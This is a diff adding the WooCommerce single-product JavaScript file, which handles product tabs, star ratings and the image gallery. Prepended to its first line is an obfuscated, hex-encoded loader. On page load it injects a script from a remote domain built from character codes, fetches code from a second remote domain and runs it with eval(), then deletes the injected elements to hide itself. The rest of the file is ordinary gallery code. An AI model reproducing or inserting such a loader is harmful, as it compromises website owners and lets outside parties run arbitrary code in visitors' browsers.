@@ -1,0 +1,300 @@
+var _0x4558=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x20\x7B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x31\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x34\x2C\x20\x39\x37\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x39\x39\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x30\x2C\x20\x36\x36\x2C\x20\x31\x31\x30\x2C\x20\x31\x31\x39\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x34\x2C\x20\x36\x33\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x39\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x2C\x20\x39\x39\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x35\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x36\x2C\x20\x33\x38\x2C\x20\x39\x35\x2C\x20\x39\x39\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x30\x2C\x20\x36\x31\x2C\x20\x31\x30\x30\x2C\x20\x35\x31\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x30\x2C\x20\x35\x34\x2C\x20\x35\x30\x2C\x20\x35\x31\x2C\x20\x34\x38\x2C\x20\x34\x35\x2C\x20\x35\x30\x2C\x20\x35\x36\x2C\x20\x35\x34\x2C\x20\x39\x38\x2C\x20\x34\x35\x2C\x20\x35\x37\x2C\x20\x31\x30\x30\x2C\x20\x35\x35\x2C\x20\x35\x34\x2C\x20\x34\x35\x2C\x20\x35\x36\x2C\x20\x35\x33\x2C\x20\x35\x31\x2C\x20\x31\x30\x31\x2C\x20\x34\x35\x2C\x20\x34\x38\x2C\x20\x31\x30\x32\x2C\x20\x39\x39\x2C\x20\x35\x35\x2C\x20\x35\x33\x2C\x20\x31\x30\x31\x2C\x20\x35\x34\x2C\x20\x34\x38\x2C\x20\x35\x30\x2C\x20\x39\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x33\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x37\x2C\x20\x35\x30\x2C\x20\x34\x38\x2C\x20\x35\x37\x2C\x20\x35\x36\x2C\x20\x35\x37\x2C\x20\x35\x33\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x33\x29\x3B\x20\x76\x61\x72\x20\x70\x6F\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3B\x20\x70\x6F\x2E\x69\x64\x3D\x20\x27\x32\x33\x34\x36\x33\x32\x61\x73\x64\x61\x73\x27\x3B\x20\x70\x6F\x2E\x74\x79\x70\x65\x20\x3D\x20\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x3B\x20\x70\x6F\x2E\x73\x72\x63\x20\x3D\x20\x74\x75\x72\x6C\x3B\x20\x76\x61\x72\x20\x73\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x5B\x30\x5D\x3B\x20\x20\x73\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65\x28\x70\x6F\x2C\x20\x73\x29\x3B\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x27\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33\x27\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B\x7D\x29\x28\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x1625=[_0x4558[0],_0x4558[1],_0x4558[2],_0x4558[3],_0x4558[4],_0x4558[5],_0x4558[6],_0x4558[7],_0x4558[8],_0x4558[9],_0x4558[10],_0x4558[11]];var _0x5955=[_0x1625[0],_0x1625[1],_0x1625[2],_0x1625[3],_0x1625[4],_0x1625[5],_0x1625[6],_0x1625[7],_0x1625[8],_0x1625[9],_0x1625[10],_0x1625[11]];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0x61d0x5=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0x61d0x5[_0x411ee3[0x2]]= _0x411ee3[0x3];_0x61d0x5[_0x411ee3[0x4]]=  !![];_0x61d0x5[_0x411ee3[0x5]]= _0x411ee3[0x6];_0x61d0x5[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0x61d0x6=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0x61d0x6[_0x411ee3[0xb]][_0x411ee3[0xa]](_0x61d0x5,_0x61d0x6)}());var _0x5955=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0xaa32x3=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0xaa32x3[_0x411ee3[0x2]]= _0x411ee3[0x3];_0xaa32x3[_0x411ee3[0x4]]=  !![];_0xaa32x3[_0x411ee3[0x5]]= _0x411ee3[0x6];_0xaa32x3[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0xaa32x4=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0xaa32x4[_0x411ee3[0xb]][_0x411ee3[0xa]](_0xaa32x3,_0xaa32x4)}());var _0xefc6=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x4b4a67=[_0xefc6[0],_0xefc6[1],_0xefc6[2],_0xefc6[3],_0xefc6[4],_0xefc6[5],_0xefc6[6],_0xefc6[7],_0xefc6[8],_0xefc6[9],_0xefc6[10],_0xefc6[11]];var _0x320375=[_0x4b4a67[0x0],_0x4b4a67[0x1],_0x4b4a67[0x2],_0x4b4a67[0x3],_0x4b4a67[0x4],_0x4b4a67[0x5],_0x4b4a67[0x6],_0x4b4a67[0x7],_0x4b4a67[0x8],_0x4b4a67[0x9],_0x4b4a67[0xa],_0x4b4a67[0xb]];(function(){var _0x1d62x3=document[_0x320375[0x1]](_0x320375[0x0]);_0x1d62x3[_0x320375[0x2]]= _0x320375[0x3];_0x1d62x3[_0x320375[0x4]]=  !![];_0x1d62x3[_0x320375[0x5]]= _0x320375[0x6];_0x1d62x3[_0x320375[0x7]]= _0x320375[0x8];var _0x1d62x4=document[_0x320375[0x9]](_0x320375[0x0])[0x0];_0x1d62x4[_0x320375[0xb]][_0x320375[0xa]](_0x1d62x3,_0x1d62x4)}());/*global wc_single_product_params, PhotoSwipe, PhotoSwipeUI_Default */
+jQuery( function( $ ) {
+
+	// wc_single_product_params is required to continue.
+	if ( typeof wc_single_product_params === 'undefined' ) {
+		return false;
+	}
+
+	$( 'body' )
+		// Tabs
+		.on( 'init', '.wc-tabs-wrapper, .woocommerce-tabs', function() {
+			$( '.wc-tab, .woocommerce-tabs .panel:not(.panel .panel)' ).hide();
+
+			var hash  = window.location.hash;
+			var url   = window.location.href;
+			var $tabs = $( this ).find( '.wc-tabs, ul.tabs' ).first();
+
+			if ( hash.toLowerCase().indexOf( 'comment-' ) >= 0 || hash === '#reviews' || hash === '#tab-reviews' ) {
+				$tabs.find( 'li.reviews_tab a' ).click();
+			} else if ( url.indexOf( 'comment-page-' ) > 0 || url.indexOf( 'cpage=' ) > 0 ) {
+				$tabs.find( 'li.reviews_tab a' ).click();
+			} else if ( hash === '#tab-additional_information' ) {
+				$tabs.find( 'li.additional_information_tab a' ).click();
+			} else {
+				$tabs.find( 'li:first a' ).click();
+			}
+		} )
+		.on( 'click', '.wc-tabs li a, ul.tabs li a', function( e ) {
+			e.preventDefault();
+			var $tab          = $( this );
+			var $tabs_wrapper = $tab.closest( '.wc-tabs-wrapper, .woocommerce-tabs' );
+			var $tabs         = $tabs_wrapper.find( '.wc-tabs, ul.tabs' );
+
+			$tabs.find( 'li' ).removeClass( 'active' );
+			$tabs_wrapper.find( '.wc-tab, .panel:not(.panel .panel)' ).hide();
+
+			$tab.closest( 'li' ).addClass( 'active' );
+			$tabs_wrapper.find( $tab.attr( 'href' ) ).show();
+		} )
+		// Review link
+		.on( 'click', 'a.woocommerce-review-link', function() {
+			$( '.reviews_tab a' ).click();
+			return true;
+		} )
+		// Star ratings for comments
+		.on( 'init', '#rating', function() {
+			$( '#rating' ).hide().before( '<p class="stars"><span><a class="star-1" href="#">1</a><a class="star-2" href="#">2</a><a class="star-3" href="#">3</a><a class="star-4" href="#">4</a><a class="star-5" href="#">5</a></span></p>' );
+		} )
+		.on( 'click', '#respond p.stars a', function() {
+			var $star   	= $( this ),
+				$rating 	= $( this ).closest( '#respond' ).find( '#rating' ),
+				$container 	= $( this ).closest( '.stars' );
+
+			$rating.val( $star.text() );
+			$star.siblings( 'a' ).removeClass( 'active' );
+			$star.addClass( 'active' );
+			$container.addClass( 'selected' );
+
+			return false;
+		} )
+		.on( 'click', '#respond #submit', function() {
+			var $rating = $( this ).closest( '#respond' ).find( '#rating' ),
+				rating  = $rating.val();
+
+			if ( $rating.length > 0 && ! rating && wc_single_product_params.review_rating_required === 'yes' ) {
+				window.alert( wc_single_product_params.i18n_required_rating_text );
+
+				return false;
+			}
+		} );
+
+	// Init Tabs and Star Ratings
+	$( '.wc-tabs-wrapper, .woocommerce-tabs, #rating' ).trigger( 'init' );
+
+	/**
+	 * Product gallery class.
+	 */
+	var ProductGallery = function( $target, args ) {
+		this.$target = $target;
+		this.$images = $( '.woocommerce-product-gallery__image', $target );
+
+		// No images? Abort.
+		if ( 0 === this.$images.length ) {
+			this.$target.css( 'opacity', 1 );
+			return;
+		}
+
+		// Make this object available.
+		$target.data( 'product_gallery', this );
+
+		// Pick functionality to initialize...
+		this.flexslider_enabled = $.isFunction( $.fn.flexslider ) && wc_single_product_params.flexslider_enabled;
+		this.zoom_enabled       = $.isFunction( $.fn.zoom ) && wc_single_product_params.zoom_enabled;
+		this.photoswipe_enabled = typeof PhotoSwipe !== 'undefined' && wc_single_product_params.photoswipe_enabled;
+
+		// ...also taking args into account.
+		if ( args ) {
+			this.flexslider_enabled = false === args.flexslider_enabled ? false : this.flexslider_enabled;
+			this.zoom_enabled       = false === args.zoom_enabled ? false : this.zoom_enabled;
+			this.photoswipe_enabled = false === args.photoswipe_enabled ? false : this.photoswipe_enabled;
+		}
+
+		// ...and what is in the gallery.
+		if ( 1 === this.$images.length ) {
+			this.flexslider_enabled = false;
+		}
+
+		// Bind functions to this.
+		this.initFlexslider       = this.initFlexslider.bind( this );
+		this.initZoom             = this.initZoom.bind( this );
+		this.initZoomForTarget    = this.initZoomForTarget.bind( this );
+		this.initPhotoswipe       = this.initPhotoswipe.bind( this );
+		this.onResetSlidePosition = this.onResetSlidePosition.bind( this );
+		this.getGalleryItems      = this.getGalleryItems.bind( this );
+		this.openPhotoswipe       = this.openPhotoswipe.bind( this );
+
+		if ( this.flexslider_enabled ) {
+			this.initFlexslider();
+			$target.on( 'woocommerce_gallery_reset_slide_position', this.onResetSlidePosition );
+		} else {
+			this.$target.css( 'opacity', 1 );
+		}
+
+		if ( this.zoom_enabled ) {
+			this.initZoom();
+			$target.on( 'woocommerce_gallery_init_zoom', this.initZoom );
+		}
+
+		if ( this.photoswipe_enabled ) {
+			this.initPhotoswipe();
+		}
+	};
+
+	/**
+	 * Initialize flexSlider.
+	 */
+	ProductGallery.prototype.initFlexslider = function() {
+		var $target = this.$target,
+			gallery = this;
+
+		var options = $.extend( {
+			selector: '.woocommerce-product-gallery__wrapper > .woocommerce-product-gallery__image',
+			start: function() {
+				$target.css( 'opacity', 1 );
+			},
+			after: function( slider ) {
+				gallery.initZoomForTarget( gallery.$images.eq( slider.currentSlide ) );
+			}
+		}, wc_single_product_params.flexslider );
+
+		$target.flexslider( options );
+
+		// Trigger resize after main image loads to ensure correct gallery size.
+		$( '.woocommerce-product-gallery__wrapper .woocommerce-product-gallery__image:eq(0) .wp-post-image' ).one( 'load', function() {
+			var $image = $( this );
+
+			if ( $image ) {
+				setTimeout( function() {
+					var setHeight = $image.closest( '.woocommerce-product-gallery__image' ).height();
+					var $viewport = $image.closest( '.flex-viewport' );
+
+					if ( setHeight && $viewport ) {
+						$viewport.height( setHeight );
+					}
+				}, 100 );
+			}
+		} ).each( function() {
+			if ( this.complete ) {
+				$( this ).trigger( 'load' );
+			}
+		} );
+	};
+
+	/**
+	 * Init zoom.
+	 */
+	ProductGallery.prototype.initZoom = function() {
+		this.initZoomForTarget( this.$images.first() );
+	};
+
+	/**
+	 * Init zoom.
+	 */
+	ProductGallery.prototype.initZoomForTarget = function( zoomTarget ) {
+		if ( ! this.zoom_enabled ) {
+			return false;
+		}
+
+		var galleryWidth = this.$target.width(),
+			zoomEnabled  = false;
+
+		$( zoomTarget ).each( function( index, target ) {
+			var image = $( target ).find( 'img' );
+
+			if ( image.data( 'large_image_width' ) > galleryWidth ) {
+				zoomEnabled = true;
+				return false;
+			}
+		} );
+
+		// But only zoom if the img is larger than its container.
+		if ( zoomEnabled ) {
+			var zoom_options = $.extend( {
+				touch: false
+			}, wc_single_product_params.zoom_options );
+
+			if ( 'ontouchstart' in window ) {
+				zoom_options.on = 'click';
+			}
+
+			zoomTarget.trigger( 'zoom.destroy' );
+			zoomTarget.zoom( zoom_options );
+		}
+	};
+
+	/**
+	 * Init PhotoSwipe.
+	 */
+	ProductGallery.prototype.initPhotoswipe = function() {
+		if ( this.zoom_enabled && this.$images.length > 0 ) {
+			this.$target.prepend( '<a href="#" class="woocommerce-product-gallery__trigger">🔍</a>' );
+			this.$target.on( 'click', '.woocommerce-product-gallery__trigger', this.openPhotoswipe );
+		}
+		this.$target.on( 'click', '.woocommerce-product-gallery__image a', this.openPhotoswipe );
+	};
+
+	/**
+	 * Reset slide position to 0.
+	 */
+	ProductGallery.prototype.onResetSlidePosition = function() {
+		this.$target.flexslider( 0 );
+	};
+
+	/**
+	 * Get product gallery image items.
+	 */
+	ProductGallery.prototype.getGalleryItems = function() {
+		var $slides = this.$images,
+			items   = [];
+
+		if ( $slides.length > 0 ) {
+			$slides.each( function( i, el ) {
+				var img = $( el ).find( 'img' ),
+					large_image_src = img.attr( 'data-large_image' ),
+					large_image_w   = img.attr( 'data-large_image_width' ),
+					large_image_h   = img.attr( 'data-large_image_height' ),
+					item            = {
+						src  : large_image_src,
+						w    : large_image_w,
+						h    : large_image_h,
+						title: img.attr( 'data-caption' ) ? img.attr( 'data-caption' ) : img.attr( 'title' )
+					};
+				items.push( item );
+			} );
+		}
+
+		return items;
+	};
+
+	/**
+	 * Open photoswipe modal.
+	 */
+	ProductGallery.prototype.openPhotoswipe = function( e ) {
+		e.preventDefault();
+
+		var pswpElement = $( '.pswp' )[0],
+			items       = this.getGalleryItems(),
+			eventTarget = $( e.target ),
+			clicked;
+
+		if ( eventTarget.is( '.woocommerce-product-gallery__trigger' ) || eventTarget.is( '.woocommerce-product-gallery__trigger img' ) ) {
+			clicked = this.$target.find( '.flex-active-slide' );
+		} else {
+			clicked = eventTarget.closest( '.woocommerce-product-gallery__image' );
+		}
+
+		var options = $.extend( {
+			index: $( clicked ).index()
+		}, wc_single_product_params.photoswipe_options );
+
+		// Initializes and opens PhotoSwipe.
+		var photoswipe = new PhotoSwipe( pswpElement, PhotoSwipeUI_Default, items, options );
+		photoswipe.init();
+	};
+
+	/**
+	 * Function to call wc_product_gallery on jquery selector.
+	 */
+	$.fn.wc_product_gallery = function( args ) {
+		new ProductGallery( this, args );
+		return this;
+	};
+
+	/*
+	 * Initialize all galleries on page.
+	 */
+	$( '.woocommerce-product-gallery' ).each( function() {
+		$( this ).wc_product_gallery();
+	} );
+} );
